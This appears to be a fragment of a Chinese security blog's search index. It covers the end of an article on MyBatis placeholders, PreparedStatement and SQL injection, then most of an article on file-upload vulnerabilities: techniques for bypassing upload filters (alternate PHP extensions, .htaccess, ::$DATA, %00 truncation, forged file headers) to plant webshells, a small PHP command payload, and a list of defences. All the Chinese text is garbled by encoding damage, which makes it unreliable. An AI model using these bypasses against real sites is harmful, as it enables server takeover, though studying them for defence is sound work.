cachedMetadata, boolean isBatch) { // ... ... try { // å¦‚æœ sendPacket ä¸º nullï¼Œåˆ™è°ƒç”¨ sendQueryString æ–¹æ³•ï¼ŒæŠŠåŸå§‹ sql å’Œå‚æ•°åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æ•°æ®åŒ… return packet == null ? ((NativeProtocol) this.protocol).sendQueryString(callingQuery, query, this.characterEncoding.getValue(), maxRows, streamResults, cachedMetadata, resultSetFactory) // å¦åˆ™è°ƒç”¨ sendQueryPacket æ–¹æ³•ï¼Œç›´æ¥å‘é€æ•°æ®åŒ… : ((NativeProtocol) this.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, cachedMetadata, resultSetFactory); } // ... ... } æ›´å…·ä½“çš„å®ç°å°±ä¸çœ‹äº†ï¼ŒåŸºæœ¬éƒ½æ˜¯å…³äºåºåˆ—åŒ–è¯·æ±‚å‚æ•°çš„é€»è¾‘ã€‚ ä¸‰ã€Myabtiså ä½ç¬¦ä¸é¢„ç¼–è¯‘ è‡³æ­¤é—®é¢˜çœŸç›¸å¤§ç™½äº†ï¼Œä¸è¿‡è¿˜æ˜¯é¡ºå¸¦æ‰¯ä¸€ä¸‹å…«è‚¡æ–‡å¸¸æåˆ°çš„ Mybatis å ä½ç¬¦ #{} ä¸ ${} æ˜¯å¦‚ä½•å½±å“ SQL æ³¨å…¥é—®é¢˜çš„ã€‚ å½“ç„¶ï¼Œçœ‹å®Œä¸Šé¢çš„å†…å®¹å…¶å®å°±å·²ç»å¾ˆå¥½çŒœåˆ°åŸå› äº†ï¼š #{} å¯¹åº”çš„å†…å®¹ä¼šä½œä¸º SQL å‚æ•°çš„ä¸€éƒ¨åˆ†é€šè¿‡ PreparedStatement.setXXX è£…å…¥è¯·æ±‚ï¼› ${} å¯¹åº”çš„å†…å®¹ä¼šç›´æ¥ä½œä¸º SQL æ¨¡æ¿çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸ä¼šè§†ä¸ºç‹¬ç«‹çš„è¯·æ±‚å‚æ•°ï¼› åœ¨ Mybatis ä¸­ï¼Œç”¨äºè§£æå ä½ç¬¦çš„ç±»ä¸º GenericTokenParser ï¼Œæ ¹æ®å®ƒæˆ‘ä»¬å¾ˆå®¹æ˜“åœ¨æºç ä¸­æ‰¾åˆ°å ä½ç¬¦çš„å¤„ç†æ–¹æ³•ï¼Œä»è€ŒéªŒè¯æˆ‘ä»¬çš„çŒœæƒ³ï¼š å…¶ä¸­ï¼Œ#{} å ä½ç¬¦åœ¨ SqlSourceBuilder.ParameterMappingTokenHandler.handleToken æ–¹æ³•ä¸­å¤„ç†ï¼š public String handleToken(String content) { parameterMappings.add(buildParameterMapping(content)); return \"?\"; } å¯è§ #{} å ä½ç¬¦ä¼šè¢«è§£æä¸º ? å ä½ç¬¦ï¼Œè€Œå¯¹äºçš„æ•°æ®ä¼šè¢«æ·»åŠ åˆ° parameterMappings ç”¨äºåç»­å¡åˆ° PreparedStatementã€‚ è€Œ ${} å ä½ç¬¦åœ¨ PropertyParser.VariableTokenHandler.handleToken æ–¹æ³•ä¸­è¢«å¤„ç†ï¼š public String handleToken(String content) { if (variables != null) { String key = content; if (enableDefaultValue) { final int separatorIndex = content.indexOf(defaultValueSeparator); String defaultValue = null; if (separatorIndex &gt;= 0) { key = content.substring(0, separatorIndex); defaultValue = content.substring(separatorIndex + defaultValueSeparator.length()); } if (defaultValue != null) { return variables.getProperty(key, defaultValue); } } if (variables.containsKey(key)) { return variables.getProperty(key); } } return \"${\" + content + \"}\"; } è‹¥å ä½ç¬¦ç¬¦åˆè§„èŒƒï¼Œåˆ™å ä¼šæ ¹æ®å ä½ç¬¦ä¸­çš„å†…å®¹å»ç”¨æˆ·ç»™å®šçš„å‚æ•°ä¸­å–å€¼ï¼Œå¹¶ä¸”è®©å€¼ç›´æ¥æ›¿æ¢æ‰åŸæœ¬ SQL è„šæœ¬ä¸­çš„ ${} å ä½ç¬¦ã€‚ è¿™å°±æ˜¯â€œ Mybatis ç”¨ #{} è€Œä¸æ˜¯ ${} å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥çš„çœŸç›¸ã€‚ æ€»ç»“ å›é¡¾ä¸€ä¸‹å…¨æ–‡ï¼Œå½“æˆ‘ä»¬è¯´â€œé¢„ç¼–è¯‘â€çš„æ—¶å€™ï¼Œå…¶å®è¿™ä¸ªåŠŸèƒ½æ¥è‡ªäºæ•°æ®åº“çš„æ”¯æŒï¼Œå®ƒçš„åŸç†æ˜¯å…ˆç¼–è¯‘å¸¦æœ‰å ä½ç¬¦çš„ SQL æ¨¡æ¿ï¼Œç„¶ååœ¨ä¼ å…¥å‚æ•°è®©æ•°æ®åº“è‡ªåŠ¨æ›¿æ¢ SQL ä¸­å ä½ç¬¦å¹¶æ‰§è¡Œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç”±äºé¢„ç¼–è¯‘å¥½çš„ SQL æ¨¡æ¿æœ¬èº«è¯­æ³•å·²ç»å®šæ­»ï¼Œå› æ­¤åç»­æ‰€æœ‰å‚æ•°éƒ½ä¼šè¢«è§†ä¸ºä¸å¯æ‰§è¡Œçš„é SQL ç‰‡æ®µè¢«è½¬ä¹‰ï¼Œå› æ­¤èƒ½å¤Ÿé˜²æ­¢ SQL æ³¨å…¥ã€‚ å½“æˆ‘ä»¬é€šè¿‡ JDBC ä½¿ç”¨ PreparedStatement æ‰§è¡Œé¢„ç¼–è¯‘ SQL çš„æ—¶å€™ï¼Œæ­¤å¤„çš„é¢„ç¼–è¯‘å®é™…ä¸Šæ˜¯å‡çš„é¢„ç¼–è¯‘ï¼ˆè‡³å°‘ MySQL æ˜¯å¦‚æ­¤ï¼Œä¸è¿‡å…¶ä»–æ•°æ®åº“ä»å¾…ç¡®è®¤ï¼‰ï¼ŒPreparedStatement åªæ˜¯åœ¨è®¾ç½®å‚æ•°çš„æ—¶å€™è‡ªåŠ¨åšäº†ä¸€å±‚è½¬ä¹‰ï¼Œæœ€ç»ˆæäº¤ç»™æ•°æ®åº“æ‰§è¡Œçš„ SQL ä»ç„¶æ˜¯å•æ¡çš„éé¢„ç¼–è¯‘ SQLã€‚ è€Œå½“æˆ‘ä»¬é€šè¿‡åœ¨é©±åŠ¨ url ä¸Šå¼€å¯ useServerPrepStmts é…ç½®åï¼Œé¢„ç¼–è¯‘å°±ä¼šçœŸæ­£çš„ç”Ÿæ•ˆï¼Œé©±åŠ¨åŒ…å‘å¾€æ•°æ®åº“çš„è¯·æ±‚å°±ä¼šåˆ†æˆå¸¦å ä½ç¬¦çš„ SQL æ¨¡æ¿å’Œå‚æ•°ï¼Œåˆ°äº†æ•°æ®åº“å†ç”±æ•°æ®åº“å®Œæˆæ ¼å¼åŒ–å¹¶æ‰§è¡Œã€‚ æ­¤å¤–ï¼Œå…«è‚¡æ–‡å¸¸æåˆ°çš„â€œMybatis çš„ #{} ç›¸æ¯” ${} å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥â€è¿™ä¸€ç‚¹ï¼Œæœ¬è´¨ä¸Šæ˜¯å› ä¸º #{} å ä½ç¬¦ä¼šè¢«è§£æä¸º SQL æ¨¡æ¿ä¸­çš„ ? å ä½ç¬¦ï¼Œè€Œ ${} å ä½ç¬¦ä¼šè¢«ç›´æ¥è§£æä¸º SQL æ¨¡æ¿çš„ä¸€éƒ¨åˆ†å¯¼è‡´çš„ã€‚ æœ€åè„‘è¡¥ä¸€ä¸‹ï¼Œç”±äº useServerPrepStmts ä¸å¼€å¯æ—¶ PreparedStatement çš„é¢„ç¼–è¯‘å®é™…ä¸Šæ˜¯å‡çš„é¢„ç¼–è¯‘ï¼Œæ‰€ä»¥ç†è®ºä¸Šä½¿ç”¨ #{} ä¹Ÿå¹¶éç»å¯¹å®‰å…¨ï¼Œå¦‚æœæœ‰åŠæ³•ç»•è¿‡ PreparedStatement çš„æ£€æŸ¥ï¼Œé‚£ä¹ˆæ•°æ®åº“æ‹¿åˆ°è¢«æ³¨å…¥è¿‡çš„ SQL ç›´æ¥æ‰§è¡Œï¼Œä¾ç„¶æœ‰æš´æ¯™çš„é£é™©ã€‚","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…ææ–‡ä»¶æ“ä½œæ¼æ´","path":"/2023/08/07/qian-xi-wen-jian-cao-zuo-lou-dong/","content":"0x01 æ–‡ä»¶ä¸Šä¼  å…ˆäº†è§£ä¸€ä¸‹åŸºç¡€çŸ¥è¯† è¦æ·±å…¥äº†è§£æ–‡ä»¶ä¸Šä¼ ï¼Œå¿…é¡»äº†è§£ä¸Šä¼ å±æ€§ã€å¸¸è§æ–‡ä»¶çš„ç»“æ„ã€å›¾å½¢å¤„ç†å‡½æ•°ç­‰å†…å®¹ã€‚ 1ï¼‰ æŠ¥æ–‡ç‰¹ç‚¹ï¼š è§‚å¯Ÿæ–‡ä»¶ä¸Šä¼ æŠ¥æ–‡çš„ç‰¹ç‚¹ï¼š Headerä¸­Content-Typeç‰¹å¾æœ‰äºŒï¼š 1.multipart/form-dataï¼ˆformè¡¨å•çš„enctypeå±æ€§ï¼Œè§„å®šä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼‰ 2.boundaryå­—ç¬¦ä¸²ï¼ˆä½œç”¨ä¸ºåˆ†éš”ç¬¦ï¼Œä»¥åŒºåˆ†POSTæ•°æ®ï¼‰ POSTå†…å®¹ç‰¹å¾æœ‰äº”ï¼š 1.Content-Dispositionï¼šform-data 2. nameï¼šinputè¡¨å•å 3.filenameï¼šæ–‡ä»¶å 4.Content-Typeï¼šå®šä¹‰æ–‡ä»¶çš„ç±»å‹å’Œç½‘é¡µçš„ç¼–ç ï¼Œå†³å®šæµè§ˆå™¨å°†ä»¥ä»€ä¹ˆå½¢å¼ã€ä»€ä¹ˆç¼–ç è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼› 5.boundaryï¼šContent-Typeçš„å€¼å‰é¢åŠ äº†ä¸¤ä¸ª--- 2ï¼‰ å¸¸è§æ ¡éªŒè§„åˆ™ ç°å­˜å¸¸ç”¨çš„ä¸Šä¼ æ ¡éªŒè§„åˆ™æ— éä¸‹é¢å‡ ç±»ï¼š 1.å®¢æˆ·ç«¯javascriptæ ¡éªŒï¼ˆåç¼€åï¼‰ 2.æ–‡ä»¶å¤´content-typeå­—æ®µæ ¡éªŒï¼ˆimage/gifï¼‰ï¼šé™„å¸¦å‚æ•° 4.åç¼€åé»‘/ç™½åå•æ ¡éªŒï¼šæ‰©å±•å 5.æ–‡ä»¶å†…å®¹å¤´æ ¡éªŒï¼šGIF89a 6.æ–‡ä»¶å†…å®¹æ ¡éªŒï¼šæ–‡ä»¶ä¿¡æ¯ï¼ŒäºŒæ¬¡æ¸²æŸ“ 7.è‡ªå®šä¹‰æ­£åˆ™æ ¡éªŒ 3ï¼‰ä¸€ä¸ªæ¾„æ¸… â€‹ æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶è§£ææ˜¯ä¸¤ä¸ªè¿‡ç¨‹ï¼Œå³ä½¿æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯phpæ–‡ä»¶ï¼Œä½†è§£æä¸ºå›¾ç‰‡ï¼Œè®¿é—®phpæ–‡ä»¶ä¼šæ˜¾ç¤ºâ€œå›¾ç‰‡æ— æ³•æ˜¾ç¤ºâ€ï¼›æˆ–è€…æˆ‘ä»¬ä¸Šä¼ çš„æ˜¯jpgæ–‡ä»¶ï¼Œä½†é‡Œé¢æ··æœ‰shellè„šæœ¬ï¼Œè‹¥è¢«è§£æä¸ºphpæ–‡ä»¶ä¹Ÿä¼šæ‰§è¡Œï¼›åˆæˆ–è€…ä¸Šä¼ å¤„æ²¡æ³•ç»•è¿‡æ£€æµ‹ï¼Œåªèƒ½ä¸Šä¼ jpgæ–‡ä»¶ï¼Œä½†åœ¨å…¶ä»–åŠŸèƒ½å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«ç­‰åŠŸèƒ½ï¼Œä»å¯æ‰§è¡ŒæˆåŠŸã€‚ è¿˜æ˜¯å›åˆ°å®‰å…¨çš„æœ¬è´¨ï¼Œä¸Šä¼ æ˜¯â€œè¾“å…¥â€ï¼Œé‚£æ–‡ä»¶è§£æå°±æ˜¯â€œè¾“å‡ºâ€ï¼Œä»»ä½•æ¼æ´æŒ–æ˜éƒ½éœ€è¦ç»“åˆè¾“å…¥+è¾“å‡ºã€‚ 4) æŒ–æ˜æ€è·¯ ä¸Šä¼ æ¼æ´æŒ–æ˜æ€è·¯æ€»ç»“èµ·æ¥åˆ†ä¸‰æ­¥ï¼š 1ã€é¦–å…ˆå°è¯•ç›´æ¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶è¿›è¡ŒRCEï¼› 2ã€è‹¥å­˜åœ¨è¿‡æ»¤ï¼Œå¯¹äºæ£€æµ‹æœºåˆ¶è¿›è¡ŒçŒœæµ‹ï¼Œç¡®å®šæœºåˆ¶åå°è¯•ç»•è¿‡ï¼› 3ã€è‹¥æ— æ³•ç»•è¿‡ä¸Šä¼ ï¼Œæ’å…¥è„šæœ¬åå¯»æ‰¾è§£æ/æ–‡ä»¶åŒ…å«æ¼æ´ï¼› 4ã€æ¢å…¶ä»–ç±»å‹æ–‡ä»¶ï¼šhtmlã€jsã€svgç­‰è½¬åˆ°æŒ–æ˜å…¶ä»–æ¼æ´ã€‚ ä¸€ã€æ–‡ä»¶ä¸Šä¼ å¸¸è§åœºæ™¯ åœºæ™¯ï¼š 1.å®¢æˆ·ç«¯JavaScriptæ£€æµ‹ å¦‚æœä¸Šä¼ éæ³•æ–‡ä»¶ï¼Œè¿”å›ç»“æœå¾ˆå¿«ï¼Œæˆ–è€…F12æ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼Œä¸Šä¼ éæ³•æ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰ç½‘ç»œè¯·æ±‚ï¼Œä½†æ˜¯è¢«æ‹¦æˆªäº†ï¼Œå¾ˆæœ‰å¯èƒ½å°±æ˜¯å®¢æˆ·ç«¯è¿›è¡Œäº†JSæ ¡éªŒæ£€æµ‹ã€‚è¿™ç§å‰ç«¯é‡‡ç”¨JSé™åˆ¶ä¸Šä¼ ç±»å‹å’Œå¤§å°çš„æ–¹å¼ ç»•è¿‡æ€è·¯ï¼š1.ç›´æ¥æœ¬åœ°ç¦ç”¨JSï¼Œä¸è®©å…¶åšæ£€æµ‹ 2.æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åç±»å‹ï¼Œç»•è¿‡æ£€æµ‹é™åˆ¶ 2.æœåŠ¡å™¨åç«¯æ£€æµ‹ æœåŠ¡å™¨åç«¯æ£€æµ‹æœ‰è¾ƒå¤šæ–¹å¼ï¼Œæ™®éåˆ†ä¸ºæ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œæ–‡ä»¶å¤´ç±»å‹ï¼Œæ–‡ä»¶æ‰©å±•ååå•æ£€æµ‹ï¼Œæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼Œæ¥ä¸‹æ¥è¿›è¡Œç®€è¦åˆ†æã€‚ a.æ–‡ä»¶ç±»å‹æ£€æµ‹ æ­¤ç±»æ£€æµ‹é˜²æŠ¤ä¸»è¦æ˜¯ä»content-typeè¿›è¡Œæ£€æµ‹ï¼Œæ£€éªŒè¯·æ±‚ä¸­content-typeæ˜¯å¦ç¬¦åˆå¯æ¥å—çš„ä¸Šä¼ ç±»å‹ (å¦‚\"image/gif\",\"image/png\",\"image/jpeg\") ç»•è¿‡æ€è·¯ï¼šæŠ“åŒ…å°†content-typeæ”¹ä¸ºå¯æ¥å—å›¾ç‰‡å½¢å¼ï¼Œå³å¯ç»•è¿‡ b.æ–‡ä»¶å¤´ç±»å‹æ£€æµ‹ ä¸Šä¸ªæ–‡ä»¶ç±»å‹æ˜¯æ£€æµ‹content-type,æ¯”è¾ƒå¥½ä¼ªé€ ï¼Œè¿™ä¸ªåˆ™æ˜¯ä½¿ç”¨getimagesize()å‡½æ•°æ¥è·å–æ–‡ä»¶çš„MIMEç±»å‹ï¼Œé€šè¿‡æ–‡ä»¶å¤´è¿›è¡Œåˆ¤æ–­æ–‡ä»¶ç±»å‹ ç»•è¿‡æ€è·¯ï¼šé’ˆå¯¹è¿™ç§ï¼Œä¸Šä¼ æœ¨é©¬æ¶æ„æ–‡ä»¶æ—¶ï¼Œå…ˆä½¿ç”¨ç¼–è¾‘å·¥å…·åœ¨æ•°æ®æœ€å‰é¢æ·»åŠ å›¾ç‰‡çš„æ–‡ä»¶å¤´è¿›è¡Œä¼ªé€ ï¼Œå³å¯ç»•è¿‡ c.æ–‡ä»¶æ‰©å±•åæ£€æµ‹ è¿™ç§ç±»å‹æœ‰åŸºäºé»‘åå•æ£€æµ‹å’Œç™½åå•æ£€æµ‹ã€‚é€šå¸¸åŸºäºé»‘åå•æ˜¯å¾ˆä¸å®‰å…¨çš„ï¼Œé»‘åå•æœºåˆ¶ï¼šåªæ‹¦æˆªåå•ä¸­å‡ºç°çš„æ‰©å±•åç¼€åï¼Œå…¶ä½™é»˜è®¤æ”¾è¡Œã€‚è¿™å°±å–å†³äºåå•ä¸­çš„æ‰©å±•åç¼€åè¦†ç›–èƒ½åŠ›èŒƒå›´äº†ï¼Œå¾ˆéš¾æŠŠæ‰€æœ‰çš„è€ƒè™‘å…¨é¢ï¼Œå°±å¾ˆå®¹æ˜“é€ æˆæ¼æ´ã€‚ é»‘åå•ç»•è¿‡æ€è·¯ï¼šå¯ä»¥ä»æœåŠ¡å™¨çš„è§£æç‰¹æ€§è¿›è¡Œåˆ†æï¼Œå¦‚ç‰¹æ®Šå¯è§£æåç¼€php3,php7,phtml,jspxç­‰ å¦‚ç‰¹æ®Šçš„è§£ææ–¹å¼é™Œç”Ÿåç¼€åï¼Œå¸¦æ¢è¡Œåç¼€åï¼ŒåŒåç¼€åç­‰è§£æå·®å¼‚é€ æˆçš„æ¼æ´ã€‚ è¿˜å¯ä»¥ä»æ··æ·†æ–¹é¢å‡ºå‘ï¼Œåç¼€åå¤§å°å†™ï¼Œç‚¹ç»•è¿‡ï¼Œç©ºæ ¼ç»•è¿‡ï¼Œä»¥åŠä¸Šä¼ .htaccessé…ç½®æ§åˆ¶æ–‡ä»¶æƒé™å’Œ::$DATAæ•°æ®æµçš„ä½¿ç”¨ åŸºäºç™½åå•ç›¸å¯¹äºé»‘åå•å°±å®‰å…¨å¾ˆå¤šäº†ï¼Œè¦æ±‚åªèƒ½æ˜¯ç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶æ‰èƒ½å¤Ÿä¸Šä¼ ã€‚ ç™½åå•ç»•è¿‡æ€è·¯ï¼šMIMEç»•è¿‡ï¼Œä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºç™½åå•å¯æ¥å—çš„ç±»å‹ï¼Œä»¥åŠ%00ï¼Œ0x00æˆªæ–­ç»•è¿‡ï¼Œè¿™ç§åœºæ™¯é’ˆå¯¹save_pathå¯æ§ã€‚ æ³¨ï¼š00æˆªæ–­åŸç†å…¶å®å¾ˆå·§å¦™ï¼Œåˆ©ç”¨åœºæ™¯æ˜¯æ–‡ä»¶ä¿å­˜è·¯å¾„å¯æ§ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ç¬¦åˆç™½åå•å°±è¡Œï¼ŒçœŸæ­£åŠ¨æ‰‹çš„åœ°æ–¹åœ¨æ–‡ä»¶ä¿å­˜è·¯å¾„å‡ºï¼Œå¯ä»¥æ”¾ä¸Šè‡ªå·±çš„webshellæ–‡ä»¶ï¼Œç„¶ååœ¨webshellæ–‡ä»¶åé¢æ·»åŠ %00,æˆ–0x00ï¼Œå†åŠ ä¸€äº›å­—ç¬¦ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç³»ç»Ÿåœ¨è§£æç¢°åˆ°00å°±ä¼šæˆªæ–­ï¼Œåé¢å­—ç¬¦å°±ä¸èµ·ä½œç”¨ï¼Œåªå‰©ä¸‹å‰é¢çš„webshellæ–‡ä»¶åï¼Œå°±å¯ä»¥åœ¨urlä¸­è¿›è¡Œè®¿é—®äº†ã€‚%00å’Œ0x00çš„ä½¿ç”¨åŒºåˆ«åœ¨äºæäº¤getè¯·æ±‚æ—¶ï¼Œæ˜¯%00,ä¼šè¿›è¡Œurlè‡ªåŠ¨è§£ç åŠ¨ä½œï¼Œç„¶åè¿›å…¥éªŒè¯å‡½æ•°ã€‚0x00åˆ™æ˜¯postè¯·æ±‚ç›´æ¥è¿›å…¥éªŒè¯å‡½æ•°ã€‚ d.æ–‡ä»¶å†…å®¹æ£€æµ‹ æ¯”è¾ƒå‰å®³çš„é˜²æŠ¤æ£€æµ‹ï¼Œå°±æ˜¯é’ˆå¯¹å†…å®¹åšæ£€æµ‹ï¼Œè¿™ç§é˜²æŠ¤èƒ½åŠ›æ¯”è¾ƒå¼ºï¼Œä½†ä¹Ÿä¸æ˜¯ä¸èƒ½ç»•è¿‡ã€‚è‡ªå§‹è‡³ç»ˆï¼Œæ”»é˜²éƒ½æ˜¯åœ¨å¯¹æŠ—ä¸­èºæ—‹æ¼”è¿›çš„ã€‚ è¿™ç§æ£€æµ‹é˜²æŠ¤åŸºæœ¬éƒ½æ˜¯ä»webshellå…·æœ‰çš„ä»£è¡¨æ€§æ•æ„Ÿå­—ç¬¦?æˆ–è€…å±é™©æ•æ„Ÿå‡½æ•°ã€‚ ç»•è¿‡æ€è·¯ï¼šä»ç‰¹æ®Šæ•æ„Ÿå­—ç¬¦å¼€å§‹è¿›è¡ŒFuzzæµ‹è¯•ï¼Œæ¢æµ‹webshellä¸­æœ‰å¤šå°‘å¿…è¦çš„å­—ç¬¦å­˜åœ¨è¢«æ›¿æ¢ï¼Œå¦‚æœæ„æˆwebshellæ‰§è¡Œçš„å­—ç¬¦è¢«æ›¿æ¢å¾—è¾ƒå¤šï¼Œå‰©ä¸‹æœªè¿‡æ»¤çš„å­—ç¬¦çš„éš¾ä»¥æ”¯æ’‘webshellæ‰§è¡Œï¼Œå¯ä»¥æ¢ä¸ªè§’åº¦åˆ©ç”¨ç³»ç»Ÿï¼Œè°ƒç”¨è„šæœ¬è¯­è¨€ï¼Œå¦‚&lt;script language='php'&gt;system('ls');&lt;script&gt;ã€‚ e.å¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ ç»•è¿‡æ€è·¯ï¼šå€Ÿé‰´äºŒè¿›åˆ¶ä¸­é’©å­çš„æ€æƒ³ï¼Œå…¶å®å°±æ˜¯æƒ³åœ¨ä¸Šä¼ å›¾ç‰‡ä¸­æ‰¾ä¸€å—\"åœ°æ–¹\"ï¼Œå­˜å‚¨webshellï¼Œè¿™å—\"åœ°æ–¹\"è¦æ±‚åœ¨åç«¯å¤„ç†åæ²¡æœ‰è¢«è¿‡æ»¤æ‰ã€‚é‚£å°±ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œç„¶åä¸‹è½½ä¸‹æ¥ï¼Œdiffä¸€ä¸‹ï¼ŒæŸ¥çœ‹å“ªäº›ä½ç½®æ²¡æœ‰è¢«æ”¹åŠ¨è¿‡ï¼Œç„¶åæ·»åŠ webshellè¿›è¡Œå°è¯•ã€‚ äºŒã€æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸç† æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼ˆphpã€jspã€xmlã€cerç­‰æ–‡ä»¶ï¼‰ï¼Œè€ŒWEBç³»ç»Ÿæ²¡æœ‰è¿›è¡Œæ£€æµ‹æˆ–é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ã€‚ æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œé—®é¢˜åœ¨äºä¸Šä¼ åå¦‚ä½•å¤„ç†åŠè§£é‡Šæ–‡ä»¶ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨éƒ½ä¼šå…è®¸ç”¨æˆ·ä¸Šä¼ ä¸€äº›æ–‡ä»¶ï¼Œå¦‚å¤´åƒã€é™„ä»¶ç­‰ä¿¡æ¯ï¼Œå¦‚æœWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæœ‰æ•ˆçš„æ£€æŸ¥è¿‡æ»¤ï¼Œé‚£ä¹ˆæ¶æ„ç”¨æˆ·å°±ä¼šä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ç­‰Webshellï¼Œä»è€Œè¾¾åˆ°æ§åˆ¶Webç½‘ç«™çš„ç›®çš„ã€‚ å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ¯”å¦‚ç›¸å†Œã€å¤´åƒä¸Šä¼ ï¼Œè§†é¢‘ã€ç…§ç‰‡åˆ†äº«ã€‚è®ºå›å‘å¸–å’Œé‚®ç®±ç­‰å¯ä»¥ä¸Šä¼ é™„ä»¶çš„åœ°æ–¹ä¹Ÿæ˜¯ä¸Šä¼ æ¼é˜”çš„é«˜å±åœ°å¸¦ï¼Œå¦å¤–åƒæ–‡ä»¶ç®¡ç†å™¨è¿™æ ·çš„åŠŸèƒ½ä¹Ÿæœ‰å¯èƒ½è¢«æ”»å‡»è€…æ‰€åˆ©ç”¨ã€‚ è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ ä¸‰ã€åˆ©ç”¨æ–¹å¼ 1.ä¸Šä¼ WebShellæ–‡ä»¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡è¿™äº›ç½‘é¡µåé—¨æ‰§è¡Œå‘½ä»¤å¹¶æ§åˆ¶æœåŠ¡å™¨ã€‚ 2.ä¸Šä¼ æ–‡ä»¶æ˜¯é’“é±¼å›¾ç‰‡æˆ–è€…åŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡æ—¶ï¼Œå›¾ç‰‡ä¸­çš„è„šæœ¬ï¼Œåœ¨æŸäº›ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸Šä¼šè¢«ä½œä¸ºè„šæœ¬æ‰§è¡Œï¼Œä»è€Œè¢«åˆ©ç”¨äºé’“é±¼æˆ–è€…æ¬ºè¯ˆ 3.ä¸Šä¼ ç—…æ¯’ã€æœ¨é©¬æ–‡ä»¶ï¼Œç”¨äºè¯±éª—ç”¨æˆ·å’Œç®¡ç†å‘˜ä¸‹è½½æ‰§è¡Œæˆ–è€…ç›´æ¥è‡ªåŠ¨è¿è¡Œã€‚ 4.ä¸Šä¼ æ–‡ä»¶æ˜¯å…¶ä»–æ¶æ„è„šæœ¬æ—¶ï¼Œæ”»å‡»è€…å¯ç›´æ¥æ‰§è¡Œè„šæœ¬è¿›è¡Œæ”»å‡»ã€‚ å¸¸ç”¨é˜²å¾¡æ–¹å¼: 1.æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ è·¯å¾„ ( é¿å… 0x00 æˆªæ–­ã€ IIS6.0 æ–‡ä»¶å¤¹è§£ææ¼æ´ã€ç›®å½•éå† ) 2.æ–‡ä»¶æ‰©å±•åæ£€æµ‹ ( é¿å…æœåŠ¡å™¨ä»¥éå›¾ç‰‡çš„æ–‡ä»¶æ ¼å¼è§£ææ–‡ä»¶ ),éªŒè¯æ–‡ä»¶æ‰©å±•å é€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ : é»‘åå•å’Œç™½åå• . 3.æ–‡ä»¶ MIMEéªŒè¯ ( æ¯”å¦‚ GIF å›¾ç‰‡ MIMEä¸º image/gif,CSS æ–‡ä»¶çš„ MIMEä¸º text/css ç­‰ ) 4.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ ( æœ€å˜æ€çš„ä¸Šä¼ æ¼æ´é˜²å¾¡æ–¹å¼ , åŸºæœ¬ä¸Šå®Œå…¨é¿å…äº†æ–‡ä»¶ä¸Šä¼ æ¼æ´ ) 5.æ–‡ä»¶é‡å‘½å ( å¦‚éšæœºå­—ç¬¦ä¸²æˆ–æ—¶é—´æˆ³ç­‰æ–¹å¼ , é˜²æ­¢æ”»å‡»è€…å¾—åˆ° webshell çš„è·¯å¾„ ) 6.éšè—ä¸Šä¼ è·¯å¾„ 7.æ–‡ä»¶å†…å®¹æ£€æµ‹ ( é¿å…å›¾ç‰‡ä¸­æ’å…¥ webshell) å››ã€ç»•è¿‡æ–¹å¼ 1.å‰ç«¯æ£€æµ‹ ä¸»è¦æ˜¯é€šè¿‡JavaScriptä»£ç è¿›è¡Œæ£€æµ‹ï¼Œæ˜¯æœ€ç®€å•çš„ç»•è¿‡ ç»•è¿‡æ–¹æ³•ï¼š åˆ é™¤æˆ–è€…ç¦ç”¨jsï¼šç«ç‹â€“&gt;ç‚¹å‡»JSä½¿å…¶ä¸ºç°è‰²-&gt;æˆåŠŸç¦ç”¨ ä½¿ç”¨ä»£ç†ä¸Šä¼ æ–‡ä»¶ï¼Œbrup suiteï¼›ä¸Šä¼ ç¬¦åˆè¦æ±‚çš„æ–‡ä»¶ç±»å‹ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ 